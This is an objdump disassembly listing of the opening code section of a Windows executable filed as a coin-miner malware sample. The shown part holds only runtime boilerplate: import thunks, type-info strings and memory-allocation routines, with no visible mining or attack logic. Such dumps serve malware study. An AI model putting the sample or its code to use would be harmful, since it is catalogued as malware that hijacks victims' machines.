
malware_samples/miner/044d234d96ba4d2c8d6b75dce9f3b778137708ed2fd39edfab8711d3431f8763.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	04 10                	add    $0x10,%al
  401002:	40                   	inc    %eax
  401003:	00 0a                	add    %cl,(%edx)
  401005:	06                   	push   %es
  401006:	53                   	push   %ebx
  401007:	74 72                	je     0x40107b
  401009:	69 6e 67 58 10 40 00 	imul   $0x401058,0x67(%esi),%ebp
	...
  40102c:	58                   	pop    %eax
  40102d:	10 40 00             	adc    %al,0x0(%eax)
  401030:	04 00                	add    $0x0,%al
  401032:	00 00                	add    %al,(%eax)
  401034:	00 00                	add    %al,(%eax)
  401036:	00 00                	add    %al,(%eax)
  401038:	28 40 40             	sub    %al,0x40(%eax)
  40103b:	00 34 40             	add    %dh,(%eax,%eax,2)
  40103e:	40                   	inc    %eax
  40103f:	00 38                	add    %bh,(%eax)
  401041:	40                   	inc    %eax
  401042:	40                   	inc    %eax
  401043:	00 3c 40             	add    %bh,(%eax,%eax,2)
  401046:	40                   	inc    %eax
  401047:	00 30                	add    %dh,(%eax)
  401049:	40                   	inc    %eax
  40104a:	40                   	inc    %eax
  40104b:	00 a8 3d 40 00 c4    	add    %ch,-0x3bffbfc3(%eax)
  401051:	3d 40 00 00 3e       	cmp    $0x3e000040,%eax
  401056:	40                   	inc    %eax
  401057:	00 07                	add    %al,(%edi)
  401059:	54                   	push   %esp
  40105a:	4f                   	dec    %edi
  40105b:	62 6a 65             	bound  %ebp,0x65(%edx)
  40105e:	63 74 64 10          	arpl   %esi,0x10(%esp,%eiz,2)
  401062:	40                   	inc    %eax
  401063:	00 07                	add    %al,(%edi)
  401065:	07                   	pop    %es
  401066:	54                   	push   %esp
  401067:	4f                   	dec    %edi
  401068:	62 6a 65             	bound  %ebp,0x65(%edx)
  40106b:	63 74 58 10          	arpl   %esi,0x10(%eax,%ebx,2)
  40106f:	40                   	inc    %eax
  401070:	00 00                	add    %al,(%eax)
  401072:	00 00                	add    %al,(%eax)
  401074:	00 00                	add    %al,(%eax)
  401076:	00 06                	add    %al,(%esi)
  401078:	53                   	push   %ebx
  401079:	79 73                	jns    0x4010ee
  40107b:	74 65                	je     0x4010e2
  40107d:	6d                   	insl   (%dx),%es:(%edi)
  40107e:	00 00                	add    %al,(%eax)
  401080:	84 10                	test   %dl,(%eax)
  401082:	40                   	inc    %eax
  401083:	00 0f                	add    %cl,(%edi)
  401085:	0a 49 49             	or     0x49(%ecx),%cl
  401088:	6e                   	outsb  %ds:(%esi),(%dx)
  401089:	74 65                	je     0x4010f0
  40108b:	72 66                	jb     0x4010f3
  40108d:	61                   	popa
  40108e:	63 65 00             	arpl   %esp,0x0(%ebp)
  401091:	00 00                	add    %al,(%eax)
  401093:	00 01                	add    %al,(%ecx)
	...
  40109d:	c0 00 00             	rolb   $0x0,(%eax)
  4010a0:	00 00                	add    %al,(%eax)
  4010a2:	00 00                	add    %al,(%eax)
  4010a4:	46                   	inc    %esi
  4010a5:	06                   	push   %es
  4010a6:	53                   	push   %ebx
  4010a7:	79 73                	jns    0x40111c
  4010a9:	74 65                	je     0x401110
  4010ab:	6d                   	insl   (%dx),%es:(%edi)
  4010ac:	03 00                	add    (%eax),%eax
  4010ae:	ff                   	(bad)
  4010af:	ff cc                	dec    %esp
  4010b1:	83 44 24 04 f8       	addl   $0xfffffff8,0x4(%esp)
  4010b6:	e9 25 51 00 00       	jmp    0x4061e0
  4010bb:	83 44 24 04 f8       	addl   $0xfffffff8,0x4(%esp)
  4010c0:	e9 43 51 00 00       	jmp    0x406208
  4010c5:	83 44 24 04 f8       	addl   $0xfffffff8,0x4(%esp)
  4010ca:	e9 4d 51 00 00       	jmp    0x40621c
  4010cf:	cc                   	int3
  4010d0:	cc                   	int3
  4010d1:	b1 10                	mov    $0x10,%cl
  4010d3:	40                   	inc    %eax
  4010d4:	00 bb 10 40 00 c5    	add    %bh,-0x3affbff0(%ebx)
  4010da:	10 40 00             	adc    %al,0x0(%eax)
  4010dd:	01 00                	add    %eax,(%eax)
	...
  4010e7:	00 00                	add    %al,(%eax)
  4010e9:	c0 00 00             	rolb   $0x0,(%eax)
  4010ec:	00 00                	add    %al,(%eax)
  4010ee:	00 00                	add    %al,(%eax)
  4010f0:	46                   	inc    %esi
  4010f1:	d1 10                	rcll   $1,(%eax)
  4010f3:	40                   	inc    %eax
  4010f4:	00 08                	add    %cl,(%eax)
  4010f6:	00 00                	add    %al,(%eax)
  4010f8:	00 00                	add    %al,(%eax)
  4010fa:	00 00                	add    %al,(%eax)
  4010fc:	00 8d 40 00 4c 11    	add    %cl,0x114c0040(%ebp)
  401102:	40                   	inc    %eax
  401103:	00 dd                	add    %bl,%ch
  401105:	10 40 00             	adc    %al,0x0(%eax)
	...
  401120:	4c                   	dec    %esp
  401121:	11 40 00             	adc    %eax,0x0(%eax)
  401124:	0c 00                	or     $0x0,%al
  401126:	00 00                	add    %al,(%eax)
  401128:	0c 10                	or     $0x10,%al
  40112a:	40                   	inc    %eax
  40112b:	00 28                	add    %ch,(%eax)
  40112d:	40                   	inc    %eax
  40112e:	40                   	inc    %eax
  40112f:	00 b4 61 40 00 c0 61 	add    %dh,0x61c00040(%ecx,%eiz,2)
  401136:	40                   	inc    %eax
  401137:	00 3c 40             	add    %bh,(%eax,%eax,2)
  40113a:	40                   	inc    %eax
  40113b:	00 30                	add    %dh,(%eax)
  40113d:	40                   	inc    %eax
  40113e:	40                   	inc    %eax
  40113f:	00 d0                	add    %dl,%al
  401141:	61                   	popa
  401142:	40                   	inc    %eax
  401143:	00 c4                	add    %al,%ah
  401145:	3d 40 00 00 3e       	cmp    $0x3e000040,%eax
  40114a:	40                   	inc    %eax
  40114b:	00 11                	add    %dl,(%ecx)
  40114d:	54                   	push   %esp
  40114e:	49                   	dec    %ecx
  40114f:	6e                   	outsb  %ds:(%esi),(%dx)
  401150:	74 65                	je     0x4011b7
  401152:	72 66                	jb     0x4011ba
  401154:	61                   	popa
  401155:	63 65 64             	arpl   %esp,0x64(%ebp)
  401158:	4f                   	dec    %edi
  401159:	62 6a 65             	bound  %ebp,0x65(%edx)
  40115c:	63 74 8b c0          	arpl   %esi,-0x40(%ebx,%ecx,4)
  401160:	ff 25 b0 f1 e1 00    	jmp    *0xe1f1b0
  401166:	8b c0                	mov    %eax,%eax
  401168:	ff 25 ac f1 e1 00    	jmp    *0xe1f1ac
  40116e:	8b c0                	mov    %eax,%eax
  401170:	ff 25 a8 f1 e1 00    	jmp    *0xe1f1a8
  401176:	8b c0                	mov    %eax,%eax
  401178:	ff 25 a4 f1 e1 00    	jmp    *0xe1f1a4
  40117e:	8b c0                	mov    %eax,%eax
  401180:	ff 25 a0 f1 e1 00    	jmp    *0xe1f1a0
  401186:	8b c0                	mov    %eax,%eax
  401188:	ff 25 9c f1 e1 00    	jmp    *0xe1f19c
  40118e:	8b c0                	mov    %eax,%eax
  401190:	ff 25 98 f1 e1 00    	jmp    *0xe1f198
  401196:	8b c0                	mov    %eax,%eax
  401198:	ff 25 94 f1 e1 00    	jmp    *0xe1f194
  40119e:	8b c0                	mov    %eax,%eax
  4011a0:	ff 25 90 f1 e1 00    	jmp    *0xe1f190
  4011a6:	8b c0                	mov    %eax,%eax
  4011a8:	ff 25 8c f1 e1 00    	jmp    *0xe1f18c
  4011ae:	8b c0                	mov    %eax,%eax
  4011b0:	ff 25 88 f1 e1 00    	jmp    *0xe1f188
  4011b6:	8b c0                	mov    %eax,%eax
  4011b8:	ff 25 84 f1 e1 00    	jmp    *0xe1f184
  4011be:	8b c0                	mov    %eax,%eax
  4011c0:	ff 25 c4 f1 e1 00    	jmp    *0xe1f1c4
  4011c6:	8b c0                	mov    %eax,%eax
  4011c8:	ff 25 80 f1 e1 00    	jmp    *0xe1f180
  4011ce:	8b c0                	mov    %eax,%eax
  4011d0:	ff 25 c0 f1 e1 00    	jmp    *0xe1f1c0
  4011d6:	8b c0                	mov    %eax,%eax
  4011d8:	ff 25 7c f1 e1 00    	jmp    *0xe1f17c
  4011de:	8b c0                	mov    %eax,%eax
  4011e0:	ff 25 78 f1 e1 00    	jmp    *0xe1f178
  4011e6:	8b c0                	mov    %eax,%eax
  4011e8:	ff 25 74 f1 e1 00    	jmp    *0xe1f174
  4011ee:	8b c0                	mov    %eax,%eax
  4011f0:	ff 25 70 f1 e1 00    	jmp    *0xe1f170
  4011f6:	8b c0                	mov    %eax,%eax
  4011f8:	ff 25 6c f1 e1 00    	jmp    *0xe1f16c
  4011fe:	8b c0                	mov    %eax,%eax
  401200:	ff 25 68 f1 e1 00    	jmp    *0xe1f168
  401206:	8b c0                	mov    %eax,%eax
  401208:	ff 25 64 f1 e1 00    	jmp    *0xe1f164
  40120e:	8b c0                	mov    %eax,%eax
  401210:	ff 25 60 f1 e1 00    	jmp    *0xe1f160
  401216:	8b c0                	mov    %eax,%eax
  401218:	ff 25 5c f1 e1 00    	jmp    *0xe1f15c
  40121e:	8b c0                	mov    %eax,%eax
  401220:	ff 25 58 f1 e1 00    	jmp    *0xe1f158
  401226:	8b c0                	mov    %eax,%eax
  401228:	ff 25 54 f1 e1 00    	jmp    *0xe1f154
  40122e:	8b c0                	mov    %eax,%eax
  401230:	ff 25 50 f1 e1 00    	jmp    *0xe1f150
  401236:	8b c0                	mov    %eax,%eax
  401238:	ff 25 4c f1 e1 00    	jmp    *0xe1f14c
  40123e:	8b c0                	mov    %eax,%eax
  401240:	ff 25 bc f1 e1 00    	jmp    *0xe1f1bc
  401246:	8b c0                	mov    %eax,%eax
  401248:	ff 25 48 f1 e1 00    	jmp    *0xe1f148
  40124e:	8b c0                	mov    %eax,%eax
  401250:	ff 25 44 f1 e1 00    	jmp    *0xe1f144
  401256:	8b c0                	mov    %eax,%eax
  401258:	ff 25 40 f1 e1 00    	jmp    *0xe1f140
  40125e:	8b c0                	mov    %eax,%eax
  401260:	ff 25 d4 f1 e1 00    	jmp    *0xe1f1d4
  401266:	8b c0                	mov    %eax,%eax
  401268:	ff 25 d0 f1 e1 00    	jmp    *0xe1f1d0
  40126e:	8b c0                	mov    %eax,%eax
  401270:	ff 25 cc f1 e1 00    	jmp    *0xe1f1cc
  401276:	8b c0                	mov    %eax,%eax
  401278:	ff 25 3c f1 e1 00    	jmp    *0xe1f13c
  40127e:	8b c0                	mov    %eax,%eax
  401280:	ff 25 38 f1 e1 00    	jmp    *0xe1f138
  401286:	8b c0                	mov    %eax,%eax
  401288:	ff 25 34 f1 e1 00    	jmp    *0xe1f134
  40128e:	8b c0                	mov    %eax,%eax
  401290:	ff 25 e4 f1 e1 00    	jmp    *0xe1f1e4
  401296:	8b c0                	mov    %eax,%eax
  401298:	ff 25 e0 f1 e1 00    	jmp    *0xe1f1e0
  40129e:	8b c0                	mov    %eax,%eax
  4012a0:	ff 25 dc f1 e1 00    	jmp    *0xe1f1dc
  4012a6:	8b c0                	mov    %eax,%eax
  4012a8:	ff 25 30 f1 e1 00    	jmp    *0xe1f130
  4012ae:	8b c0                	mov    %eax,%eax
  4012b0:	ff 25 2c f1 e1 00    	jmp    *0xe1f12c
  4012b6:	8b c0                	mov    %eax,%eax
  4012b8:	ff 25 28 f1 e1 00    	jmp    *0xe1f128
  4012be:	8b c0                	mov    %eax,%eax
  4012c0:	ff 25 24 f1 e1 00    	jmp    *0xe1f124
  4012c6:	8b c0                	mov    %eax,%eax
  4012c8:	53                   	push   %ebx
  4012c9:	83 c4 bc             	add    $0xffffffbc,%esp
  4012cc:	bb 0a 00 00 00       	mov    $0xa,%ebx
  4012d1:	54                   	push   %esp
  4012d2:	e8 51 ff ff ff       	call   0x401228
  4012d7:	f6 44 24 2c 01       	testb  $0x1,0x2c(%esp)
  4012dc:	74 05                	je     0x4012e3
  4012de:	0f b7 5c 24 30       	movzwl 0x30(%esp),%ebx
  4012e3:	8b c3                	mov    %ebx,%eax
  4012e5:	83 c4 44             	add    $0x44,%esp
  4012e8:	5b                   	pop    %ebx
  4012e9:	c3                   	ret
  4012ea:	8b c0                	mov    %eax,%eax
  4012ec:	ff 25 20 f1 e1 00    	jmp    *0xe1f120
  4012f2:	8b c0                	mov    %eax,%eax
  4012f4:	ff 25 1c f1 e1 00    	jmp    *0xe1f11c
  4012fa:	8b c0                	mov    %eax,%eax
  4012fc:	ff 25 18 f1 e1 00    	jmp    *0xe1f118
  401302:	8b c0                	mov    %eax,%eax
  401304:	ff 25 14 f1 e1 00    	jmp    *0xe1f114
  40130a:	8b c0                	mov    %eax,%eax
  40130c:	ff 25 10 f1 e1 00    	jmp    *0xe1f110
  401312:	8b c0                	mov    %eax,%eax
  401314:	ff 25 0c f1 e1 00    	jmp    *0xe1f10c
  40131a:	8b c0                	mov    %eax,%eax
  40131c:	ff 25 08 f1 e1 00    	jmp    *0xe1f108
  401322:	8b c0                	mov    %eax,%eax
  401324:	ff 25 04 f1 e1 00    	jmp    *0xe1f104
  40132a:	8b c0                	mov    %eax,%eax
  40132c:	53                   	push   %ebx
  40132d:	83 c4 f4             	add    $0xfffffff4,%esp
  401330:	bb e0 d5 41 00       	mov    $0x41d5e0,%ebx
  401335:	83 3b 00             	cmpl   $0x0,(%ebx)
  401338:	75 59                	jne    0x401393
  40133a:	68 44 06 00 00       	push   $0x644
  40133f:	6a 00                	push   $0x0
  401341:	e8 a6 ff ff ff       	call   0x4012ec
  401346:	89 44 24 08          	mov    %eax,0x8(%esp)
  40134a:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40134f:	75 07                	jne    0x401358
  401351:	33 c0                	xor    %eax,%eax
  401353:	89 04 24             	mov    %eax,(%esp)
  401356:	eb 50                	jmp    0x4013a8
  401358:	8b 44 24 08          	mov    0x8(%esp),%eax
  40135c:	8b 15 dc d5 41 00    	mov    0x41d5dc,%edx
  401362:	89 10                	mov    %edx,(%eax)
  401364:	8b 44 24 08          	mov    0x8(%esp),%eax
  401368:	a3 dc d5 41 00       	mov    %eax,0x41d5dc
  40136d:	33 c0                	xor    %eax,%eax
  40136f:	8b d0                	mov    %eax,%edx
  401371:	03 d2                	add    %edx,%edx
  401373:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401377:	8d 54 d1 04          	lea    0x4(%ecx,%edx,8),%edx
  40137b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40137f:	8b 54 24 04          	mov    0x4(%esp),%edx
  401383:	8b 0b                	mov    (%ebx),%ecx
  401385:	89 0a                	mov    %ecx,(%edx)
  401387:	8b 54 24 04          	mov    0x4(%esp),%edx
  40138b:	89 13                	mov    %edx,(%ebx)
  40138d:	40                   	inc    %eax
  40138e:	83 f8 64             	cmp    $0x64,%eax
  401391:	75 dc                	jne    0x40136f
  401393:	8b 03                	mov    (%ebx),%eax
  401395:	89 44 24 04          	mov    %eax,0x4(%esp)
  401399:	8b 44 24 04          	mov    0x4(%esp),%eax
  40139d:	8b 00                	mov    (%eax),%eax
  40139f:	89 03                	mov    %eax,(%ebx)
  4013a1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4013a5:	89 04 24             	mov    %eax,(%esp)
  4013a8:	8b 04 24             	mov    (%esp),%eax
  4013ab:	83 c4 0c             	add    $0xc,%esp
  4013ae:	5b                   	pop    %ebx
  4013af:	c3                   	ret
  4013b0:	89 00                	mov    %eax,(%eax)
  4013b2:	89 40 04             	mov    %eax,0x4(%eax)
  4013b5:	c3                   	ret
  4013b6:	8b c0                	mov    %eax,%eax
  4013b8:	53                   	push   %ebx
  4013b9:	56                   	push   %esi
  4013ba:	83 c4 f8             	add    $0xfffffff8,%esp
  4013bd:	8b f2                	mov    %edx,%esi
  4013bf:	8b d8                	mov    %eax,%ebx
  4013c1:	e8 66 ff ff ff       	call   0x40132c
  4013c6:	89 44 24 04          	mov    %eax,0x4(%esp)
  4013ca:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4013cf:	75 04                	jne    0x4013d5
  4013d1:	33 c0                	xor    %eax,%eax
  4013d3:	eb 3a                	jmp    0x40140f
  4013d5:	8b 06                	mov    (%esi),%eax
  4013d7:	8b 54 24 04          	mov    0x4(%esp),%edx
  4013db:	89 42 08             	mov    %eax,0x8(%edx)
  4013de:	8b 46 04             	mov    0x4(%esi),%eax
  4013e1:	8b 54 24 04          	mov    0x4(%esp),%edx
  4013e5:	89 42 0c             	mov    %eax,0xc(%edx)
  4013e8:	8b 03                	mov    (%ebx),%eax
  4013ea:	89 04 24             	mov    %eax,(%esp)
  4013ed:	8b 44 24 04          	mov    0x4(%esp),%eax
  4013f1:	8b 14 24             	mov    (%esp),%edx
  4013f4:	89 10                	mov    %edx,(%eax)
  4013f6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4013fa:	89 58 04             	mov    %ebx,0x4(%eax)
  4013fd:	8b 04 24             	mov    (%esp),%eax
  401400:	8b 54 24 04          	mov    0x4(%esp),%edx
  401404:	89 50 04             	mov    %edx,0x4(%eax)
  401407:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140b:	89 03                	mov    %eax,(%ebx)
  40140d:	b0 01                	mov    $0x1,%al
  40140f:	59                   	pop    %ecx
  401410:	5a                   	pop    %edx
  401411:	5e                   	pop    %esi
  401412:	5b                   	pop    %ebx
  401413:	c3                   	ret
  401414:	83 c4 f8             	add    $0xfffffff8,%esp
  401417:	8b 50 04             	mov    0x4(%eax),%edx
  40141a:	89 14 24             	mov    %edx,(%esp)
  40141d:	8b 10                	mov    (%eax),%edx
  40141f:	89 54 24 04          	mov    %edx,0x4(%esp)
  401423:	8b 14 24             	mov    (%esp),%edx
  401426:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40142a:	89 0a                	mov    %ecx,(%edx)
  40142c:	8b 54 24 04          	mov    0x4(%esp),%edx
  401430:	8b 0c 24             	mov    (%esp),%ecx
  401433:	89 4a 04             	mov    %ecx,0x4(%edx)
  401436:	8b 15 e0 d5 41 00    	mov    0x41d5e0,%edx
  40143c:	89 10                	mov    %edx,(%eax)
  40143e:	a3 e0 d5 41 00       	mov    %eax,0x41d5e0
  401443:	59                   	pop    %ecx
  401444:	5a                   	pop    %edx
  401445:	c3                   	ret
  401446:	8b c0                	mov    %eax,%eax
  401448:	53                   	push   %ebx
  401449:	56                   	push   %esi
  40144a:	57                   	push   %edi
  40144b:	55                   	push   %ebp
  40144c:	83 c4 f8             	add    $0xfffffff8,%esp
  40144f:	8b d9                	mov    %ecx,%ebx
  401451:	8b f0                	mov    %eax,%esi
  401453:	8b fc                	mov    %esp,%edi
  401455:	8b 06                	mov    (%esi),%eax
  401457:	89 07                	mov    %eax,(%edi)
  401459:	8b 02                	mov    (%edx),%eax
  40145b:	89 03                	mov    %eax,(%ebx)
  40145d:	8b 42 04             	mov    0x4(%edx),%eax
  401460:	89 43 04             	mov    %eax,0x4(%ebx)
  401463:	8b 07                	mov    (%edi),%eax
  401465:	8b 00                	mov    (%eax),%eax
  401467:	89 44 24 04          	mov    %eax,0x4(%esp)
  40146b:	8b 17                	mov    (%edi),%edx
  40146d:	8b 52 08             	mov    0x8(%edx),%edx
  401470:	8b ca                	mov    %edx,%ecx
  401472:	8b 2f                	mov    (%edi),%ebp
  401474:	03 4d 0c             	add    0xc(%ebp),%ecx
  401477:	8b 03                	mov    (%ebx),%eax
  401479:	3b c8                	cmp    %eax,%ecx
  40147b:	75 18                	jne    0x401495
  40147d:	8b 07                	mov    (%edi),%eax
  40147f:	e8 90 ff ff ff       	call   0x401414
  401484:	8b 07                	mov    (%edi),%eax
  401486:	8b 40 08             	mov    0x8(%eax),%eax
  401489:	89 03                	mov    %eax,(%ebx)
  40148b:	8b 07                	mov    (%edi),%eax
  40148d:	8b 40 0c             	mov    0xc(%eax),%eax
  401490:	01 43 04             	add    %eax,0x4(%ebx)
  401493:	eb 16                	jmp    0x4014ab
  401495:	03 43 04             	add    0x4(%ebx),%eax
  401498:	3b d0                	cmp    %eax,%edx
  40149a:	75 0f                	jne    0x4014ab
  40149c:	8b 07                	mov    (%edi),%eax
  40149e:	e8 71 ff ff ff       	call   0x401414
  4014a3:	8b 07                	mov    (%edi),%eax
  4014a5:	8b 40 0c             	mov    0xc(%eax),%eax
  4014a8:	01 43 04             	add    %eax,0x4(%ebx)
  4014ab:	8b 44 24 04          	mov    0x4(%esp),%eax
  4014af:	89 07                	mov    %eax,(%edi)
  4014b1:	3b 37                	cmp    (%edi),%esi
  4014b3:	75 ae                	jne    0x401463
  4014b5:	8b d3                	mov    %ebx,%edx
  4014b7:	8b c6                	mov    %esi,%eax
  4014b9:	e8 fa fe ff ff       	call   0x4013b8
  4014be:	84 c0                	test   %al,%al
  4014c0:	75 04                	jne    0x4014c6
  4014c2:	33 c0                	xor    %eax,%eax
  4014c4:	89 03                	mov    %eax,(%ebx)
  4014c6:	59                   	pop    %ecx
  4014c7:	5a                   	pop    %edx
  4014c8:	5d                   	pop    %ebp
  4014c9:	5f                   	pop    %edi
  4014ca:	5e                   	pop    %esi
  4014cb:	5b                   	pop    %ebx
  4014cc:	c3                   	ret
  4014cd:	8d 40 00             	lea    0x0(%eax),%eax
  4014d0:	53                   	push   %ebx
  4014d1:	56                   	push   %esi
  4014d2:	57                   	push   %edi
  4014d3:	55                   	push   %ebp
  4014d4:	83 c4 f0             	add    $0xfffffff0,%esp
  4014d7:	89 04 24             	mov    %eax,(%esp)
  4014da:	8b f4                	mov    %esp,%esi
  4014dc:	8b 06                	mov    (%esi),%eax
  4014de:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4014e2:	8b 0a                	mov    (%edx),%ecx
  4014e4:	8b 06                	mov    (%esi),%eax
  4014e6:	8b 40 08             	mov    0x8(%eax),%eax
  4014e9:	3b c8                	cmp    %eax,%ecx
  4014eb:	0f 82 86 00 00 00    	jb     0x401577
  4014f1:	8b d8                	mov    %eax,%ebx
  4014f3:	8b 3e                	mov    (%esi),%edi
  4014f5:	03 5f 0c             	add    0xc(%edi),%ebx
  4014f8:	8b f9                	mov    %ecx,%edi
  4014fa:	03 7a 04             	add    0x4(%edx),%edi
  4014fd:	3b df                	cmp    %edi,%ebx
  4014ff:	72 76                	jb     0x401577
  401501:	3b c8                	cmp    %eax,%ecx
  401503:	75 21                	jne    0x401526
  401505:	8b 42 04             	mov    0x4(%edx),%eax
  401508:	8b 0e                	mov    (%esi),%ecx
  40150a:	01 41 08             	add    %eax,0x8(%ecx)
  40150d:	8b 42 04             	mov    0x4(%edx),%eax
  401510:	8b 16                	mov    (%esi),%edx
  401512:	29 42 0c             	sub    %eax,0xc(%edx)
  401515:	8b 06                	mov    (%esi),%eax
  401517:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  40151b:	75 56                	jne    0x401573
  40151d:	8b 06                	mov    (%esi),%eax
  40151f:	e8 f0 fe ff ff       	call   0x401414
  401524:	eb 4d                	jmp    0x401573
  401526:	8b d8                	mov    %eax,%ebx
  401528:	8b 3e                	mov    (%esi),%edi
  40152a:	03 5f 0c             	add    0xc(%edi),%ebx
  40152d:	8b f9                	mov    %ecx,%edi
  40152f:	03 7a 04             	add    0x4(%edx),%edi
  401532:	3b df                	cmp    %edi,%ebx
  401534:	75 0a                	jne    0x401540
  401536:	8b 42 04             	mov    0x4(%edx),%eax
  401539:	8b 16                	mov    (%esi),%edx
  40153b:	29 42 0c             	sub    %eax,0xc(%edx)
  40153e:	eb 33                	jmp    0x401573
  401540:	8b 1a                	mov    (%edx),%ebx
  401542:	03 5a 04             	add    0x4(%edx),%ebx
  401545:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401549:	8b 3e                	mov    (%esi),%edi
  40154b:	8b 7f 08             	mov    0x8(%edi),%edi
  40154e:	8b 2e                	mov    (%esi),%ebp
  401550:	03 7d 0c             	add    0xc(%ebp),%edi
  401553:	2b fb                	sub    %ebx,%edi
  401555:	89 7c 24 08          	mov    %edi,0x8(%esp)
  401559:	2b c8                	sub    %eax,%ecx
  40155b:	8b 06                	mov    (%esi),%eax
  40155d:	89 48 0c             	mov    %ecx,0xc(%eax)
  401560:	8d 54 24 04          	lea    0x4(%esp),%edx
  401564:	8b 06                	mov    (%esi),%eax
  401566:	e8 4d fe ff ff       	call   0x4013b8
  40156b:	84 c0                	test   %al,%al
  40156d:	75 04                	jne    0x401573
  40156f:	33 c0                	xor    %eax,%eax
  401571:	eb 18                	jmp    0x40158b
  401573:	b0 01                	mov    $0x1,%al
  401575:	eb 14                	jmp    0x40158b
  401577:	8b 06                	mov    (%esi),%eax
  401579:	8b 00                	mov    (%eax),%eax
  40157b:	89 06                	mov    %eax,(%esi)
  40157d:	8b 06                	mov    (%esi),%eax
  40157f:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  401583:	0f 85 59 ff ff ff    	jne    0x4014e2
  401589:	33 c0                	xor    %eax,%eax
  40158b:	83 c4 10             	add    $0x10,%esp
  40158e:	5d                   	pop    %ebp
  40158f:	5f                   	pop    %edi
  401590:	5e                   	pop    %esi
  401591:	5b                   	pop    %ebx
  401592:	c3                   	ret
  401593:	90                   	nop
  401594:	53                   	push   %ebx
  401595:	56                   	push   %esi
  401596:	57                   	push   %edi
  401597:	8b da                	mov    %edx,%ebx
  401599:	8b f0                	mov    %eax,%esi
  40159b:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  4015a1:	7d 07                	jge    0x4015aa
  4015a3:	be 00 00 10 00       	mov    $0x100000,%esi
  4015a8:	eb 0c                	jmp    0x4015b6
  4015aa:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  4015b0:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  4015b6:	89 73 04             	mov    %esi,0x4(%ebx)
  4015b9:	6a 01                	push   $0x1
  4015bb:	68 00 20 00 00       	push   $0x2000
  4015c0:	56                   	push   %esi
  4015c1:	6a 00                	push   $0x0
  4015c3:	e8 34 fd ff ff       	call   0x4012fc
  4015c8:	8b f8                	mov    %eax,%edi
  4015ca:	89 3b                	mov    %edi,(%ebx)
  4015cc:	85 ff                	test   %edi,%edi
  4015ce:	74 23                	je     0x4015f3
  4015d0:	8b d3                	mov    %ebx,%edx
  4015d2:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  4015d7:	e8 dc fd ff ff       	call   0x4013b8
  4015dc:	84 c0                	test   %al,%al
  4015de:	75 13                	jne    0x4015f3
  4015e0:	68 00 80 00 00       	push   $0x8000
  4015e5:	6a 00                	push   $0x0
  4015e7:	8b 03                	mov    (%ebx),%eax
  4015e9:	50                   	push   %eax
  4015ea:	e8 15 fd ff ff       	call   0x401304
  4015ef:	33 c0                	xor    %eax,%eax
  4015f1:	89 03                	mov    %eax,(%ebx)
  4015f3:	5f                   	pop    %edi
  4015f4:	5e                   	pop    %esi
  4015f5:	5b                   	pop    %ebx
  4015f6:	c3                   	ret
  4015f7:	90                   	nop
  4015f8:	53                   	push   %ebx
  4015f9:	56                   	push   %esi
  4015fa:	57                   	push   %edi
  4015fb:	55                   	push   %ebp
  4015fc:	8b d9                	mov    %ecx,%ebx
  4015fe:	8b f2                	mov    %edx,%esi
  401600:	8b e8                	mov    %eax,%ebp
  401602:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  401609:	6a 04                	push   $0x4
  40160b:	68 00 20 00 00       	push   $0x2000
  401610:	68 00 00 10 00       	push   $0x100000
  401615:	55                   	push   %ebp
  401616:	e8 e1 fc ff ff       	call   0x4012fc
  40161b:	8b f8                	mov    %eax,%edi
  40161d:	89 3b                	mov    %edi,(%ebx)
  40161f:	85 ff                	test   %edi,%edi
  401621:	75 1f                	jne    0x401642
  401623:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  401629:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  40162f:	89 73 04             	mov    %esi,0x4(%ebx)
  401632:	6a 04                	push   $0x4
  401634:	68 00 20 00 00       	push   $0x2000
  401639:	56                   	push   %esi
  40163a:	55                   	push   %ebp
  40163b:	e8 bc fc ff ff       	call   0x4012fc
  401640:	89 03                	mov    %eax,(%ebx)
  401642:	83 3b 00             	cmpl   $0x0,(%ebx)
  401645:	74 23                	je     0x40166a
  401647:	8b d3                	mov    %ebx,%edx
  401649:	b8 e4 d5 41 00       	mov    $0x41d5e4,%eax
  40164e:	e8 65 fd ff ff       	call   0x4013b8
  401653:	84 c0                	test   %al,%al
  401655:	75 13                	jne    0x40166a
  401657:	68 00 80 00 00       	push   $0x8000
  40165c:	6a 00                	push   $0x0
  40165e:	8b 03                	mov    (%ebx),%eax
  401660:	50                   	push   %eax
  401661:	e8 9e fc ff ff       	call   0x401304
  401666:	33 c0                	xor    %eax,%eax
  401668:	89 03                	mov    %eax,(%ebx)
  40166a:	5d                   	pop    %ebp
  40166b:	5f                   	pop    %edi
  40166c:	5e                   	pop    %esi
  40166d:	5b                   	pop    %ebx
  40166e:	c3                   	ret
  40166f:	90                   	nop
  401670:	53                   	push   %ebx
  401671:	56                   	push   %esi
  401672:	57                   	push   %edi
  401673:	55                   	push   %ebp
  401674:	83 c4 e8             	add    $0xffffffe8,%esp
  401677:	8b f9                	mov    %ecx,%edi
  401679:	8b f4                	mov    %esp,%esi
  40167b:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  401682:	ff 
  401683:	33 c9                	xor    %ecx,%ecx
  401685:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  401689:	89 44 24 10          	mov    %eax,0x10(%esp)
  40168d:	03 54 24 10          	add    0x10(%esp),%edx
  401691:	89 54 24 14          	mov    %edx,0x14(%esp)
  401695:	a1 e4 d5 41 00       	mov    0x41d5e4,%eax
  40169a:	89 06                	mov    %eax,(%esi)
  40169c:	eb 6b                	jmp    0x401709
  40169e:	8b 06                	mov    (%esi),%eax
